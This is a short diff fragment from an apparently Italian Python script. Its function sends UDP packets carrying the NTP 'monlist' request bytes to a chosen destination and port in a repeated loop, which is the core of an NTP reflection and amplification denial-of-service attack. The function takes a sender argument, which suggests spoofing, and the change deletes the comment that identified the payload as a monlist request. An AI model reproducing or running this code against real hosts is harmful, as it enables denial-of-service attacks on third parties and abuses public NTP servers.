@@ -9,7 +9,7 @@ import time
 def invia_pacchetto_ntp(destinazione, porta, intervallo, mittente, count):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        payload = bytearray([0x17, 0x00, 0x03, 0x2a] + [0x00] * 43)  # Utilizza una richiesta NTP monlist
+        payload = bytearray([0x17, 0x00, 0x03, 0x2a] + [0x00] * 43)  
         sock.sendto(payload, (destinazione, porta))
         print("\033[1;32mPacchetto NTP inviato con successo a {}\033[0m".format(destinazione))
         if count % 50 == 0:
